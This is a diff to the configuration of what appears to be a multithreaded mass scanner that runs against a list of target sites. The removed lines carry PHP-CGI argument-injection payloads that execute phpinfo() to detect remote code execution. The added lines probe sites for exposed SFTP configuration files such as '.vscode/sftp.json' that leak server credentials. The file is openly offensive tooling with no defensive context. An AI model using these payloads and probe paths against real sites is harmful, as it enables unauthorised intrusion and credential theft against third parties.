@@ -1,20 +1,18 @@
 {
   "threads": 100,
   "siteList": "sites.txt",
-  "outputList": "rce.txt",
-  "timeout": 15,
+  "outputList": "st.txt",
+  "timeout": 5,
   "paths": [
-    "/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20phpinfo();?>",
-    "/cgi-bin/php.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20phpinfo();?>",
-    "/index.php?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20phpinfo();?>",
-    "/php-cgi/php.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20phpinfo();?>",
-    "/php-cgi/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20phpinfo();?>",
-    "/cgi-bin/php.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20phpinfo();?>"
+    "/.vscode/sftp.json",
+    "/sftp-config.json",
+    "/sftp.json",
+    "/dev/.vscode/sftp.json",
+    "/.vscode/sftp.json.bak",
+    "/.git/sftp.json"
   ],
   "contents": [
-    "Configuration File (php.ini) Path",
-    "PHP Extension",
-    "PHP Version"
+    "\"remotePath\":"
   ],
   "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
   "iterationDelay": 30
